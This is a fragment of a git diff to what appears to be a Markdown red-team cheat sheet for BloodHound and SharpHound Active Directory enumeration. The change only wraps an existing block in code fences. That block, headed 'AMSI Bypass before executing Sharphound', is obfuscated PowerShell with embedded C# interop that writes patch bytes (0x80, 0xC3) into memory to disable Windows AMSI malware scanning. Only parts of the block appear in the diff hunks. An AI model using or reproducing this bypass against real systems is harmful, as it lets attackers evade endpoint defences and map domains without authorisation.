@@ -18,6 +18,7 @@ Invoke-BloodHound -CollectionMethod All -ExcludeDC
 sudo neo4j console&;bloodhound&
 ```
 ## AMSI Bypass before executing Sharphound
+```
 $ZQCUW = @" 
 using System; 
 using System.Runtime.InteropServices; 
@@ -51,3 +52,4 @@ $XVON = "0x80"
 $WRUD = "0xC3" 
 $KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD) 
 [System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
+```
